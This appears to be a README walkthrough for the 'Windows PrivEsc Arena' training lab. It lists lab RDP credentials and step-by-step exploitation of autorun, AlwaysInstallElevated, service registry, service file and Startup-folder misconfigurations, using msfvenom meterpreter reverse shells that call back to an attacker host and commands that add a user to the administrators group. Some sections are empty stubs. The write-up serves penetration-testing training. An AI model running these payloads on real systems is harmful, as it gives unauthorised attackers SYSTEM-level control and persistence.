# Windows PrivEsc Arena

<img width="1902" height="361" alt="image" src="https://github.com/user-attachments/assets/96706b9f-7faa-4ad5-8d3f-965cd8c67d44" />

---

>[!important]
> ### Let's first connect to the machine.  RDP is open on port 3389.  Your credentials are:
> #### **`username`** : user
> #### **`password`** : password321
>
> ### `For any administrative actions you might take, your credentials are:`
> #### **`username`** : TCM
> #### **`password`** : Hacker123
>

---

>[!warning]
> ### Connect To Target
> ```ruby
> xfreerdp3 /u:user /p:password321 /v:10.10.71.148 /cert:ignore /sec:rdp
> ```
> **`Or`**
>
>```ruby
> rdesktop 10.10.103.25 -u user -p password321
>```

---

<details>
  <summary>Registry Escalation</summary>





- <details>
      <summary>Autorun</summary>




  
  Windows Privilege Escalation: Insecure Autorun Permissions
  ==========================================================
  
  This guide demonstrates a privilege escalation technique by exploiting an executable in an autorun location that has insecure file permissions. The goal is to replace the legitimate program with a malicious payload, which will be executed with higher privileges when an administrator logs in.
  
  🕵️‍♂️ Detection
  ----------------
  
  First, we need to identify the vulnerable autorun program and confirm its weak permissions.
  
  1.  Scan for Autorun Programs
  
      Open a command prompt on the Windows VM and run Autoruns to inspect programs that launch on startup.
  
      
  
      ```DOS
      C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
  
      ```
  
  2.  Inspect Logon Items
  
      In the Autoruns window, click on the Logon tab to see all applications that run when a user logs in.
  
  3.  Identify the Target Program
  
      From the list, notice the "My Program" entry. Observe that it points to the following executable:
  
      ```
      C:\Program Files\Autorun Program\program.exe
  
      ```

      <img width="819" height="209" alt="image" src="https://github.com/user-attachments/assets/08b8581f-0b3a-4cc6-9c0a-8986e8ad13da" />


  4.  Check File Permissions
  
      Return to the command prompt and use accesschk64.exe to check the permissions on the program's directory.
  
      
  
      ```DOS
      C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
  
      ```

      <img width="647" height="263" alt="image" src="https://github.com/user-attachments/assets/d20be315-7309-4288-9cb4-ec06353ce661" />


  5.  Confirm the Vulnerability
  
      The output will show that the Everyone user group has ``FILE_ALL_ACCESS`` permission. This is the vulnerability, as it means any user can modify or replace the program.exe file.
  
  💥 Exploitation
  ---------------
  
  The exploitation process involves creating a malicious payload, setting up a listener to receive the connection, and replacing the original executable.
  
  ### 1\. Setting Up the Listener & Payload (Kali VM)
  
  First, we will use the Metasploit Framework to create a reverse shell payload and a listener to catch the connection.
  
  1.  **Start Metasploit**
  
      
  
      ```Bash
      msfconsole
  
      ```
  
  2.  Configure the Multi/Handler
  
      This module will listen for the incoming connection from our payload.
  
      
  
      ```Ruby
      msf6 > use multi/handler
      msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
      msf6 exploit(multi/handler) > set lhost <Your Kali VM IP Address>
  
      ```


  3.  Start the Listener
  
      The listener will now wait for a connection.
  
      
  
      ```Ruby
      msf6 exploit(multi/handler) > run
  
      ```

      <img width="863" height="492" alt="image" src="https://github.com/user-attachments/assets/d70396ea-063a-465c-99a1-8d1fa4efc54e" />

  
  4.  Generate the Malicious Payload
  
      Open a new terminal window on your Kali VM. Use msfvenom to create a malicious program.exe that will connect back to your listener.
  
      
  
      ```Bash
      msfvenom -p windows/meterpreter/reverse_tcp lhost=<Your Kali VM IP Address> -f exe -o program.exe
  
      ```

     <img width="929" height="337" alt="image" src="https://github.com/user-attachments/assets/d4d93941-457d-46a8-8a3f-07f1eca288fe" />

  
  5.  Transfer the Payload
  
      Copy the newly generated program.exe file from your Kali VM to the Windows VM's desktop.

      <img width="1543" height="609" alt="image" src="https://github.com/user-attachments/assets/5daebdf6-0778-4aca-8596-96e866c26c38" />


  ### 2\. Planting the Payload (Windows VM)
  
  1.  On the Windows VM, replace the original program with your malicious payload. You can do this via the command line or file explorer:
  
      
  
      ```DOS
      move C:\Users\User\Desktop\program.exe "C:\Program Files\Autorun Program\program.exe"
  
      ```
  
      *(Confirm overwrite if prompted)*
  
  2.  To trigger the exploit, you must simulate the condition under which the program runs with elevated privileges. **Log off** from the current user session and then **log back on as an administrator**.
  
  ✅ Gaining Access & Verification
  -------------------------------
  
  When the administrator logs in, the malicious `program.exe` will execute and connect back to your listener on the Kali VM.
  
  1.  Catch the Session
  
      In your Metasploit terminal, you will see a new session being created.
  
      ```
      [*] Meterpreter session 1 opened (...)
  
      ```
  
  2.  Interact with the Session
  
      Enter the new session using its ID.
  
      
  
      ```Ruby
      msf6 exploit(multi/handler) > sessions -i 1
  
      ```
  
  3.  Verify Privileges
  
      To confirm that the attack was successful and you have escalated privileges, run the getuid command. The output should show that you are running as the administrator user.
  
      
  
      ```Ruby
      meterpreter > getuid
  
      ```
  





  </details>




- <details>
      <summary>AlwaysInstallElevated</summary>


  
  
  Windows Privilege Escalation: AlwaysInstallElevated
  ===================================================
  
  This guide demonstrates how to exploit the `AlwaysInstallElevated` policy in Windows to achieve privilege escalation. When this policy is enabled in both the `HKEY_LOCAL_MACHINE` (HKLM) and `HKEY_CURRENT_USER` (HKCU) registry hives, it allows any user to install MSI packages with `NT AUTHORITY\SYSTEM` privileges.
  
  🕵️‍♂️ Detection
  ----------------
  
  The first step is to query the Windows Registry to confirm that the `AlwaysInstallElevated` policy is enabled for both the system and the current user.
  
  1.  Check the Local Machine Policy (HKLM)
  
      Open a command prompt on the Windows VM and query the following registry key:
  
      
  
      ```DOS
      reg query HKLM\Software\Policies\Microsoft\Windows\Installer
  
      ```
  
      > Confirm that the `AlwaysInstallElevated` value is present and set to `0x1`.
  
  2.  Check the Current User Policy (HKCU)
  
      Next, query the key for the current user:
  
      
  
      ```DOS
      reg query HKCU\Software\Policies\Microsoft\Windows\Installer
  
      ```
  
      > Confirm that the `AlwaysInstallElevated` value is also set to `0x1`. If both keys are set to 1, the system is vulnerable.
  
  💥 Exploitation
  ---------------
  
  Now we will generate a malicious MSI package and use it to gain a privileged shell on the target machine.
  
  ### 1\. Setting Up the Listener & Payload (Kali VM)
  
  Use the Metasploit Framework on your Kali machine to create the payload and a listener to receive the connection.
  
  1.  **Start Metasploit**
  
      
  
      ```Bash
      msfconsole
  
      ```
  
  2.  Configure the Multi/Handler
  
      This module will listen for the incoming connection from our MSI payload.
  
      
  
      ```Ruby
      msf6 > use multi/handler
      msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
      msf6 exploit(multi/handler) > set lhost <Your Kali VM IP Address>
  
      ```
  
  3.  Start the Listener
  
      The listener will now wait for a connection.
  
      
  
      ```Ruby
      msf6 exploit(multi/handler) > run
  
      ```
  
  4.  Generate the Malicious MSI Payload
  
      Open a new terminal window on your Kali VM. Use msfvenom to create a malicious .msi file.
  
      
  
      ```Bash
      msfvenom -p windows/meterpreter/reverse_tcp lhost=<Your Kali VM IP Address> -f msi -o setup.msi
  
      ```
  
  5.  Transfer the Payload
  
      Copy the newly generated setup.msi file from your Kali VM to the Windows VM, placing it in a writable directory like C:\Temp.
  
  ### 2\. Executing the Payload (Windows VM)
  
  1.  On the Windows VM, open a command prompt and execute the MSI package using `msiexec`. The `/quiet` and `/qn` flags will run the installation silently in the background.
  
      
  
      ```DOS
      msiexec /quiet /qn /i C:\Temp\setup.msi
  
      ```
  
  ✅ Gaining Access
  ----------------
  
  Return to your Metasploit terminal on the Kali VM. The MSI installer will execute with `SYSTEM` privileges and connect back to your listener.
  
  1.  Catch the Privileged Shell
  
      You will see a new Meterpreter session open.
  
      ```ruby
      [*] Meterpreter session 1 opened (...)
  
      ```
  
  2.  Verify Privileges
  
      Interact with the new session and run the getuid command to confirm your identity.
  
      
  
      ```Ruby
      msf6 exploit(multi/handler) > sessions -i 1
      meterpreter > getuid
      Server username: NT AUTHORITY\SYSTEM
  
      ```
  
      You have successfully escalated to the highest privilege level on the system.
  
  



  </details>





  
</details>













<details>
  <summary>Service Escalation</summary>






- <details>
      <summary>Registry</summary>





  
  Windows Privilege Escalation: Insecure Service Registry Permissions
  ===================================================================
  
  This guide demonstrates a privilege escalation technique by exploiting a Windows service with weak permissions on its associated registry key. If a user has `FullControl` over a service's registry entry, they can modify its configuration---such as the executable it runs (`ImagePath`)---to execute arbitrary code with the service's privileges, which are often `NT AUTHORITY\SYSTEM`.
  
  🕵️‍♂️ Detection
  ----------------
  
  First, we must identify that a low-privileged user has modification rights over a service's registry key.
  
  1.  Check Registry Key Permissions
  
      Open a PowerShell prompt on the Windows VM and use Get-Acl to inspect the permissions for the target service's registry key (regsvc).
  
      
  
      ```PowerShell
      Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
  
      ```

     <img width="994" height="270" alt="image" src="https://github.com/user-attachments/assets/5f376f33-75df-4868-a440-f9afb2c52cb2" />



  2.  Identify the Vulnerability
  
      In the output, examine the Access list. Notice that the NT AUTHORITY\INTERACTIVE group has FullControl permission. This is the vulnerability. The INTERACTIVE group includes any user who is logged on locally, meaning our low-privileged user can modify this key.
  
  💥 Exploitation
  ---------------
  
  The exploitation process involves creating a custom executable, modifying the vulnerable service to run it, and then starting the service to trigger our payload.
  
  ### 1\. Preparing the Payload (Kali VM)
  
  We will compile a simple C program that adds our user to the local administrators group.
  
  1.  Transfer the Source Code
  
      First, copy the source file windows_service.c from the Windows VM (C:\Users\User\Desktop\Tools\Source\) to your Kali VM.

      <img width="1305" height="253" alt="image" src="https://github.com/user-attachments/assets/e000b2bd-8f58-4ec3-8a64-befdd41c2085" />

     
  2.  Modify the Payload Command
  
      Open windows_service.c on Kali with a text editor. Find the line containing the system() function and change its command to the following, which will add a user named user to the local administrators group.
  
      
  
      ```C
      system("cmd.exe /k net localgroup administrators user /add");
  
      ```

      <img width="703" height="576" alt="image" src="https://github.com/user-attachments/assets/4d1f4a4e-f154-4199-8c1f-f6c9fd99019d" />


  
  3.  Cross-Compile the Executable
  
      Save the file and compile it for Windows using the mingw-w64 compiler. If you don't have it, install it first with `sudo apt update && sudo apt install gcc-mingw-w64`.
  
      
  
      ```Bash
      x86_64-w64-mingw32-gcc windows_service.c -o x.exe
  
      ```

     <img width="587" height="200" alt="image" src="https://github.com/user-attachments/assets/eca01cdf-f18e-49e8-a426-b577106694fd" />

  
  4.  Transfer the Payload Back
  
      Copy the newly compiled payload, x.exe, from your Kali VM to a writable directory on the Windows VM, such as C:\Temp.

     <img width="513" height="113" alt="image" src="https://github.com/user-attachments/assets/a54a9283-0bd5-400e-a9ec-651a72a6c76c" />


  ### 2\. Modifying and Triggering the Service (Windows VM)
  
  Now, we will reconfigure the service to point to our new executable and then start it.
  
  1.  Change the Service's Binary Path
  
      On the Windows VM, open a command prompt and run the reg add command to modify the ImagePath for the regsvc service. This tells the service to run our payload instead of its original program.
  
      
  
      ```DOS
      reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
  
      ```

     <img width="648" height="127" alt="image" src="https://github.com/user-attachments/assets/8a2610a0-b3df-448f-bbea-8bf1eabcd0d6" />


  2.  Start the Service to Trigger the Exploit
  
      Now, start the service. Windows will execute c:\temp\x.exe with the service's LocalSystem privileges.
  
      
  
      ```DOS
      sc start regsvc
  
      ```

     <img width="659" height="166" alt="image" src="https://github.com/user-attachments/assets/f523d731-d60c-4996-8164-7b6f566e29c9" />

   
      The command in our payload will now execute, adding the `user` to the administrators group.
  
  ✅ Verification
  --------------
  
  To confirm that the privilege escalation was successful, check the membership of the local administrators group.
  
  1.  Check Administrators Group
  
      In the same command prompt, type:
  
      
  
      ```DOS
      net localgroup administrators
  
      ```
  
      You will now see the `user` account listed as a member, confirming that you have successfully escalated privileges.
  
  
      **`before`**

     <img width="651" height="166" alt="image" src="https://github.com/user-attachments/assets/095264d1-ad26-478e-b106-7b2e2e013f15" />


     **`after`**

     <img width="652" height="213" alt="image" src="https://github.com/user-attachments/assets/328a56ef-cd33-412a-94d0-c49ce3b4e6fe" />



  </details>


- <details>
      <summary>Executable Files</summary>




  
  
  Windows Privilege Escalation: Insecure Service File Permissions
  ===============================================================
  
  This guide demonstrates a privilege escalation technique by exploiting a Windows service whose executable has weak file permissions. If a low-privileged user can overwrite the service's executable, they can replace it with a malicious payload. When the service is next started, the payload will execute with the high privileges of the service account, typically `NT AUTHORITY\SYSTEM`.
  
  🕵️‍♂️ Detection
  ----------------
  
  First, we need to identify a service executable with insecure permissions that allows a standard user to modify or replace it.
  
  1.  Check File Permissions
  
      Open a command prompt on the Windows VM and use accesschk64.exe to inspect the permissions for the target service executable (filepermservice.exe).
  
      
  
      ```DOS
      C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
  
      ```
  
  2.  Identify the Vulnerability
  
      The output indicates that the Everyone user group has FILE_ALL_ACCESS permission on the filepermservice.exe file. This is a critical misconfiguration, as it means any user on the system can replace this executable.
  
  ⚙️ Prerequisite: Creating the Payload
  -------------------------------------
  
  Before we can exploit this, we need to create a malicious executable (`x.exe`) that will perform our privileged action. We will use `msfvenom` on a Kali VM for this.
  
  1.  Generate the Payload
  
      On your Kali machine, run the following command to generate an executable that adds a standard user named user to the local administrators group.
  
      
  
      ```Bash
      msfvenom -p windows/exec CMD="net localgroup administrators user /add" -f exe -o x.exe
  
      ```
  
  2.  Transfer the Payload
  
      Copy the newly generated x.exe from your Kali machine to a writable directory on the Windows VM, such as C:\Temp.
  
  💥 Exploitation
  ---------------
  
  With the payload ready, we can now overwrite the original service executable and start the service to trigger our exploit.
  
  1.  Overwrite the Service Executable
  
      On the Windows VM, open a command prompt and use the copy command to replace the legitimate service executable with our malicious payload. The /y flag suppresses the overwrite confirmation prompt.
  
      
  
      ```DOS
      copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
  
      ```
  
  2.  Start the Service to Trigger the Exploit
  
      Now, start the service. Windows will execute our malicious payload with LocalSystem privileges.
  
      
  
      ```DOS
      sc start filepermsvc
  
      ```
  
      The command embedded in our payload will now run, adding the `user` to the local administrators group.
  
  ✅ Verification
  --------------
  
  To confirm that the privilege escalation was successful, check the membership of the local administrators group.
  
  1.  Check Administrators Group
  
      In the same command prompt, type:
  
      
  
      ```DOS
      net localgroup administrators
  
      ```
  
      You will now see the `user` account listed as a member of the group, confirming that you have successfully escalated privileges on the system.
  
  
  





  </details>


- <details>
      <summary> DLL Hijacking</summary>
  </details>


- <details>
      <summary>binPath</summary>
  </details>


- <details>
      <summary>Unquoted Service Paths</summary>
  </details>
  
  
  
  






  
</details>
















<details>
  <summary>Privilege Escalation - Startup Applications</summary>



Windows Persistence & PrivEsc: Writable Startup Folder
======================================================

This guide demonstrates a persistence and potential privilege escalation technique by exploiting a globally writable "All Users" Startup folder. If a low-privileged user can place an executable in this folder, that program will automatically run whenever *any* user---including an administrator---logs into the system. This can be used to gain a shell with the privileges of the user who logs in next.

🕵️‍♂️ Detection
----------------

First, we need to check the permissions of the `All Users` Startup folder to see if it's writable by our current user.

1.  Check Folder Permissions

    Open a command prompt on the Windows VM and use icacls.exe to inspect the permissions for the Startup folder.

    

    ```DOS
    icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

    ```

2.  Identify the Vulnerability

    In the output, look for the permissions granted to the BUILTIN\Users group. If it shows (F) for Full Access or (M) for Modify access, the folder is writable, and the system is vulnerable to this technique.

💥 Exploitation
---------------

The exploitation process involves creating a reverse shell payload, placing it in the vulnerable Startup folder, and waiting for a privileged user to log in.

### 1\. Setting Up the Listener & Payload (Kali VM)

Use the Metasploit Framework on your Kali machine to create the payload and a listener to receive the connection.

1.  **Start Metasploit**

    

    ```Bash
    msfconsole

    ```

2.  Configure the Multi/Handler

    This module will listen for the incoming connection from our payload.

    

    ```Ruby
    msf6 > use multi/handler
    msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set lhost <Your Kali VM IP Address>

    ```

3.  Start the Listener

    The listener will now wait for a connection.

    

    ```Ruby
    msf6 exploit(multi/handler) > run

    ```

4.  Generate the Malicious Payload

    Open a new terminal window on your Kali VM. Use msfvenom to create a malicious .exe file.

    

    ```Bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your Kali VM IP Address> -f exe -o x.exe

    ```

5.  Transfer the Payload

    Copy the newly generated x.exe file from your Kali VM to a temporary location on the Windows VM (e.g., the Desktop).

### 2\. Planting the Payload (Windows VM)

1.  On the Windows VM, move your payload into the vulnerable Startup folder.

    

    ```DOS
    move C:\Users\User\Desktop\x.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"

    ```

2.  To trigger the exploit, **log off** from the current user.

3.  Now, **log in with an administrator account**. When the administrator's desktop loads, the `x.exe` file in the Startup folder will be automatically executed.

✅ Gaining Access & Verification
-------------------------------

Return to your Metasploit terminal on the Kali VM. The payload will connect back to your listener.

1.  Catch the Session

    You will see a new Meterpreter session open. This session is running with the privileges of the administrator who just logged in.

    ```
    [*] Meterpreter session 1 opened (...)

    ```

2.  Verify Privileges

    Interact with the new session and run the getuid command to confirm the user context.

    

    ```Ruby
    meterpreter > getuid
    Server username: User-PC\Admin

    ```

    The output confirms the payload is running as the `Admin` user, successfully capturing a privileged session.



  
</details>








<details>
  <summary>Potato Escalation - Hot Potato</summary>
</details>








<details>
  <summary>Password Mining Escalation</summary>





- <details>
      <summary> Configuration Files</summary>
  </details>



- <details>
      <summary>Memory</summary>
  </details>





  
</details>



<details>
  <summary>Privilege Escalation - Kernel Exploits</summary>
</details>











